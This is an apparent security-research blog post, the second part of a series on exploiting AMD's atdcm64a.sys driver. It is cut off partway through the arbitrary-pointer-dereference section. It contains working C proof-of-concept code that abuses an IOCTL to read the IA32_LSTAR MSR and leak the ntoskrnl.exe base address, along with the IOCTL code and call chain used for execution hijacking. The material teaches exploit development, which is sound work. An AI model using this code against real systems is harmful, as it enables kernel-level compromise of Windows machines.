# https://security.humanativaspa.it/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/

<!DOCTYPE html><html class="no-touch webkit chrome chrome142 linux js no-hidpi datauri lenis screen-lg screen-md screen-sm screen-xs screen-xxs orientation_portrait" lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
<body class="wp-singular post-template-default single single-post postid-4091 single-format-standard wp-theme-uncode wp-child-theme-uncode-child style-color-wayh-bg cookies-not-set group-blog hormenu-position-left megamenu-full-submenu hmenu hmenu-position-center header-full-width main-center-align menu-mobile-transparent menu-custom-padding menu-sticky-mobile menu-mobile-centered menu-mobile-off-canvas mobile-parallax-not-allowed ilb-no-bounce unreg qw-body-scroll-disabled megamenu-side-to-side no-qty-fx uncode-accessible wpb-js-composer js-comp-ver-8.7.1.2 vc_responsive uncode-loaded" data-border="0" style="margin-top: 0px; padding-top: 0px;">

		<a href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/#sections-container" class="screen-reader-shortcut btn btn-hover-nobg btn-accent btn-shadow btn-shadow-lg">Skip to main content</a>
			<div id="vh_layout_help"></div><div class="body-borders" data-border="0"><div class="top-border body-border-shadow"></div><div class="right-border body-border-shadow"></div><div class="bottom-border body-border-shadow"></div><div class="left-border body-border-shadow"></div><div class="top-border style-color-xsdn-bg"></div><div class="right-border style-color-xsdn-bg"></div><div class="bottom-border style-color-xsdn-bg"></div><div class="left-border style-color-xsdn-bg"></div></div>	<div class="box-wrapper">
		<div class="box-container" style="width: 1920px; margin-left: 0px;">
		
		<div class="menu-wrapper menu-sticky-mobile menu-no-arrows no-header" style="height: 957px;">
													
													
												</div>			
						<div class="main-wrapper">
				<div class="main-container">
					<div class="page-wrapper" role="main">
						<div class="sections-container" id="sections-container">
<article id="post-4091" class="page-body style-color-xsdn-bg post-4091 post type-post status-publish format-standard has-post-thumbnail hentry category-exploits category-vulnerabilities tag-exploit-development tag-exploit tag-ida tag-vulnerability-research tag-reverse-engineering tag-static-analysis tag-windows tag-tutorial tag-red-teaming tag-atdcm64a">
          <div class="post-wrapper">
          	<div class="post-body"><div class="post-content un-no-sidebar-layout"><div data-parent="true" class="vc_row has-bg need-focus style-color-wayh-bg row-container" id="row-unique-0"><div class="row-background background-element">
											<div class="background-wrapper">
												<div class="background-inner srcset-bg srcset-bg-async srcset-bg-init" style="background-repeat: no-repeat; background-position: center top; background-attachment: scroll; background-size: cover; background-image: url(&quot;https://hnsecurity.it/wp-content/uploads/2025/07/195503.jpg&quot;);" data-background-image="https://hnsecurity.it/wp-content/uploads/2025/07/195503.jpg" data-mobile-background-image="https://hnsecurity.it/wp-content/uploads/2025/07/195503-uai-900x507.jpg"></div>
												
											</div>
										</div><div class="row double-top-padding double-bottom-padding single-h-padding limit-width row-parent" data-imgready="true"><div class="wpb_row row-inner"><div class="wpb_column pos-middle pos-center align_center column_parent col-lg-12 single-internal-gutter"><div class="uncol style-light"><div class="uncoltable"><div class="uncell no-block-padding"><div class="uncont"><div class="uncode-single-media  text-center animate_when_almost_visible zoom-in"><div class="single-wrapper" style="max-width: 200px;"><div class="tmb tmb-light  img-circle tmb-bordered tmb-shadowed tmb-shadowed-darker-std tmb-img-ratio tmb-media-first tmb-media-last tmb-content-overlay tmb-no-bg"><div class="t-inside"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="uncode-single-media-wrapper img-circle img-thumbnail"><div class="dummy" style="padding-top: 100%;"></div><img decoding="async" class="srcset-auto wp-image-159895 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/AMD-uai-836x836.jpg" width="836" height="836" alt="" data-no-bp="" data-bp="720" data-uniqueid="159895-812459" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg" data-path="2025/09/AMD.jpg" data-width="1600" data-height="836" data-singlew="200" data-singleh="200" data-crop="1" loading="lazy"></div>
					</div>
				</div></div></div></div></div><div class="vc_custom_heading_wrap "><div class="heading-text el-text"><h1 class="h2 text-color-lxmt-color"><span>Exploiting AMD atdcm64a.sys arbitrary pointer dereference – Part 2</span></h1></div><div class="clear"></div></div></div></div></div></div></div></div></div></div><div data-parent="true" class="vc_row row-container" id="row-unique-1"><div class="row limit-width row-parent" data-imgready="true"><div class="wpb_row row-inner"><div class="wpb_column pos-top pos-center align_left column_parent col-lg-6 single-internal-gutter"><div class="uncol style-light"><div class="uncoltable"><div class="uncell no-block-padding"><div class="uncont"><div class="uncode-info-box  font-weight-500"><span class="date-info">October 2, 2024</span><span class="uncode-ib-separator uncode-ib-separator-symbol">|</span><span class="author-wrap"><a href="https://hnsecurity.it/blog/author/ale98/"><span class="uncode-ib-avatar uncode-ib-avatar-size-md"><img alt="Alessandro Iandoli" src="https://secure.gravatar.com/avatar/644822f5d8329ca419a50c1f39c97de5ccd163d1932e4cdc60a6cc8cb64ed29e?s=40&amp;d=mm&amp;r=g" class="avatar avatar-40 photo" height="40" width="40" loading="lazy" decoding="async"></span></a><span class="author-info">By <a href="https://hnsecurity.it/blog/author/ale98/">Alessandro Iandoli</a></span></span></div></div></div></div></div></div><div class="wpb_column pos-top pos-center align_right align_left_tablet align_left_mobile column_parent col-lg-6 single-internal-gutter"><div class="uncol style-light"><div class="uncoltable"><div class="uncell no-block-padding"><div class="uncont"><div class="uncode-info-box container-text font-weight-500"><span class="category-info"> <a href="https://hnsecurity.it/blog/category/exploits/" title="View all posts in Exploits" class="">Exploits</a>, <a href="https://hnsecurity.it/blog/category/vulnerabilities/" title="View all posts in Vulnerabilities" class="">Vulnerabilities</a></span></div></div></div></div></div></div></div></div></div><div data-parent="true" class="vc_row has-bg need-focus style-color-xsdn-bg row-container" id="row-unique-2"><div class="row no-top-padding double-bottom-padding single-h-padding limit-width row-parent" data-imgready="true"><div class="wpb_row row-inner"><div class="wpb_column pos-top pos-center align_left column_parent col-lg-12 custom-tag-box single-internal-gutter"><div class="uncol style-light"><div class="uncoltable"><div class="uncell  vc_custom_1758437089857 no-block-padding" style="padding-top: 0px ;"><div class="uncont"><div class="uncode_text_column container-text"><p>Welcome back! We concluded the <a href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-1/">previous article</a> by spotting two vulnerabilities in <em>atdcm64a.sys</em>: an <strong>arbitrary MSR read</strong> and an <strong>arbitrary pointer dereference</strong>. In this second part of the <a href="https://hnsecurity.it/tag/atdcm64a/">series</a> we will focus on confirming that we can actually exploit these vulnerabilities.</p>
<p>We will start with the <strong>arbitrary MSR read</strong>, by creating a PoC that exploits the vulnerability by reading a <strong>Model Specific Register (MSR)</strong> of our choice and finally retrieves the <strong>base address of ntoskrnl.exe</strong>.</p>
<p>Then we will focus on the <strong>arbitrary pointer dereference</strong>. In this case the objective of the PoC will be to <strong>redirect the execution flow to an arbitrary location</strong> leading the VM to crash by causing a <em>BSOD</em>. We will have to define multiple data structures in order to successfully hijack the execution flow and debug the driver. We will see how to <strong>debug the driver using IDA Pro with the assistance of the decompiled code</strong>.</p>
<div>
<div>
<h2>Confirming the vulnerabilities</h2>
<div>
<p>At this point the objective is confirming that we are actually able to exploit the vulnerabilities by creating a simple C/C++ program that interacts with the driver and sends the appropriate IOCTLs.</p>
</div>
<h3>Confirming the arbitrary MSR read</h3>
<div>
<p>Let’s start confirming the arbitrary MSR read vulnerability as it seems much easier to exploit. Here’s a snippet of code that allows us to confirm the vulnerability:</p>
</div>
</div>
</div>
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-monokai enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">DWORD64 g_ntbase = 0;</span></div></div><div class=""><div><span class="enlighter-text">DWORD64 g_kisystemcall64shadow = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">...</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define SIZE_BUF 4096</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IOCTL_READMSR 0x22e09c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_GS_BASE 0xc0000101</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_LSTAR    0xc0000082</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define IA32_STAR    0xc0000081</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">HANDLE g_device;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">BOOL </span><span class="enlighter-m0">readMSR</span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD msr_value,PVOID outputBuffer, SIZE_T outSize</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* inputBuffer = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    *</span><span class="enlighter-g1">((</span><span class="enlighter-text">DWORD*</span><span class="enlighter-g1">)</span><span class="enlighter-text">inputBuffer</span><span class="enlighter-g1">)</span><span class="enlighter-text"> = msr_value;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">inputBuffer == </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> -2;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] User buffer allocated: 0x%8p\n"</span><span class="enlighter-text">, inputBuffer</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD bytesRet = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    BOOL res = </span><span class="enlighter-m0">DeviceIoControl</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        g_device,</span></div></div><div class=""><div><span class="enlighter-text">        IOCTL_READMSR,</span></div></div><div class=""><div><span class="enlighter-text">        inputBuffer,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        outputBuffer,</span></div></div><div class=""><div><span class="enlighter-text">        outSize,</span></div></div><div class=""><div><span class="enlighter-text">        &amp;bytesRet,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[*] sent IOCTL_READMSR \n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!res</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[-] DeviceIoControl failed with error: %d\n"</span><span class="enlighter-text">, </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">())</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> res;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k5">int</span><span class="enlighter-text"> </span><span class="enlighter-m0">main</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD bytesRet = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    g_device = </span><span class="enlighter-m0">CreateFileA</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-s0">"\\\\.\\AtiDCM"</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        GENERIC_READ | GENERIC_WRITE,</span></div></div><div class=""><div><span class="enlighter-text">        0,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        OPEN_EXISTING,</span></div></div><div class=""><div><span class="enlighter-text">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">g_device == INVALID_HANDLE_VALUE</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[-] Failed to open handle to device."</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> -1;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] Opened handle to device: 0x%8p\n"</span><span class="enlighter-text">, g_device</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">* outputBuffer = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">VirtualAlloc</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">        SIZE_BUF,</span></div></div><div class=""><div><span class="enlighter-text">        MEM_COMMIT | MEM_RESERVE,</span></div></div><div class=""><div><span class="enlighter-text">        PAGE_EXECUTE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">outputBuffer, </span><span class="enlighter-n2">0x0</span><span class="enlighter-text">, SIZE_BUF</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">readMSR</span><span class="enlighter-g1">(</span><span class="enlighter-text">IA32_LSTAR, outputBuffer, SIZE_BUF</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] readMSR success.\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] IA32_LSTAR = 0x%8p\n"</span><span class="enlighter-text">, *</span><span class="enlighter-g1">((</span><span class="enlighter-text">DWORD64*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">outputBuffer + 12</span><span class="enlighter-g1">)))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        g_kisystemcall64shadow = *</span><span class="enlighter-g1">((</span><span class="enlighter-text">DWORD64*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">outputBuffer + 12</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        g_ntbase = </span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD64</span><span class="enlighter-g1">)</span><span class="enlighter-text">g_kisystemcall64shadow - </span><span class="enlighter-n2">0xaf61c0</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"[+] g_ntbase = 0x%p\n"</span><span class="enlighter-text">, g_ntbase</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> 0;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">[...]

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR    0xc0000082
#define IA32_STAR    0xc0000081

HANDLE g_device;


BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    *((DWORD*)inputBuffer) = msr_value;

    if (inputBuffer == NULL)
        return -2;

    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
    

    DWORD bytesRet = 0;

    
    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_READMSR,
        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &amp;bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_READMSR \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}


int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);



    if (g_device == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to device.");
        return -1;
    }

    printf("[+] Opened handle to device: 0x%8p\n", g_device);

    char* outputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);


    memset(outputBuffer, 0x0, SIZE_BUF);


    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        printf("[+] readMSR success.\n");
        printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
        //printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
        g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
        g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
        printf("[+] g_ntbase = 0x%p\n", g_ntbase);
    }

    return 0;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c" data-enlighter-theme="monokai">[...]

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;


BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    *((DWORD*)inputBuffer) = msr_value;

    if (inputBuffer == NULL)
        return -2;

    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
    

    DWORD bytesRet = 0;

    
    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_READMSR,
        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &amp;bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_READMSR \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}


int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);



    if (g_device == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to device.");
        return -1;
    }

    printf("[+] Opened handle to device: 0x%8p\n", g_device);

    char* outputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);


    memset(outputBuffer, 0x0, SIZE_BUF);


    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        printf("[+] readMSR success.\n");
        printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
        //printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
        g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
        g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
        printf("[+] g_ntbase = 0x%p\n", g_ntbase);
    }

    return 0;
}</pre>
<div>
<div>
<p>The PoC simply does the following:</p>
<ol>
<li>Open the handle to device using the name <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">\\.\AtiDCM</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">\\.\AtiDCM</code>.</li>
<li>Issue a call to <strong><em>DeviceIoControl()</em></strong> passing as input: the <em>handle</em> obtained previously, the <strong>IOCTL 0x22e09c</strong>, that allows to reach the vulnerability, the <em>inputBuffer</em>, that contains the value of the <strong>MSR that we want to read</strong> (in this case is 0xc0000082 that corresponds to the <strong>IA32_LSTAR MSR</strong>) and the <em>outputBuffer</em>.</li>
<li>Read the value of the <strong>IA32_LSTAR</strong> register from the outputBuffer (it contains the address of <div class="enlighter-default enlighter-v-inline enlighter-t-enlighter enlighter-l-generic "><span class="enlighter"><span class="enlighter-text">nt!KiSystemCall64Shadow</span></span></div><code class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">nt!KiSystemCall64Shadow</code>) and then <strong>subtract offset 0xaf61c0</strong> in order to retrieve the <strong>base address of ntoskrnl.exe</strong>.</li>
</ol>
</div>
<div>After compiling and running our PoC we get the following output.</div>
<div></div>
<div>
<figure id="attachment_3814" aria-describedby="caption-attachment-3814" style="width: 392px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" class="wp-image-3814 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-28-1.png" alt="" width="392" height="154"><figcaption id="caption-attachment-3814" class="wp-caption-text">Leaking the base of ntoskrnl.exe running the PoC</figcaption></figure>
</div>
<div>We can confirm in Windbg that the base address of ntoskrnl.exe calculated in the PoC is valid.</div>
<div></div>
<div>
<figure id="attachment_3815" aria-describedby="caption-attachment-3815" style="width: 1118px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-3815 size-full" src="https://hnsecurity.it/wp-content/uploads/2024/08/image-29-1.png" alt="" width="1118" height="309"><figcaption id="caption-attachment-3815" class="wp-caption-text">Printing the base address of ntoskrnl.exe in windbg</figcaption></figure>
</div>
</div>
</div>
<div>
<h3>Confirming the arbitrary pointer dereference</h3>
<div>
<p>In order to confirm the second vulnerability we need to:</p>
<ul>
<li>Issue another <em>DeviceIoControl()</em> passing as input: the <em>IOCTL</em> that allows to reach the vulnerability and an <strong><em>inputBuffer</em></strong>.</li>
<li>Create multiple data structures in memory to craft an <em><strong>inputBuffer </strong></em>that allows us to reach the <strong>call to arbitrary function pointer</strong> in the <em><strong>IofCallDriver()</strong></em> procedure.</li>
<li>Debug the driver.</li>
</ul>
</div>
<div>
<p>Below I try to summarize what calls are performed by the driver in the execution flow that lead to a <strong>call to arbitrary function pointer</strong>:</p>
</div>
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-monokai enlighter-l-raw enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">callDriver(*(systemBuffer+1),.....) </span></div></div><div class=""><div><span class="enlighter-text">│</span></div></div><div class=""><div><span class="enlighter-text">├&gt;AttachedDevice = IoGetAttachedDeviceReference(*(systemBuffer+1)) </span></div></div><div class=""><div><span class="enlighter-text">├&gt;IofCallDriver(AttachedDevice,...)</span></div></div><div class=""><div><span class="enlighter-text">  │</span></div></div><div class=""><div><span class="enlighter-text">  ├&gt;AttachedDevice-&gt;DriverObject-&gt;MajorFunction[IRP_MJ_XXX](AttachedDevice,...)</span></div></div></div><div class="enlighter-raw">callDriver(*(systemBuffer+1),.....) 
│
├&gt;AttachedDevice = IoGetAttachedDeviceReference(*(systemBuffer+1)) 
├&gt;IofCallDriver(AttachedDevice,...)
  │
  ├&gt;AttachedDevice-&gt;DriverObject-&gt;MajorFunction[IRP_MJ_XXX](AttachedDevice,...)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="raw" data-enlighter-theme="monokai">callDriver(*(systemBuffer+1),.....) 
│
├&gt;AttachedDevice = IoGetAttachedDeviceReference(*(systemBuffer+1)) 
├&gt;IofCallDriver(AttachedDevice,...)
  │
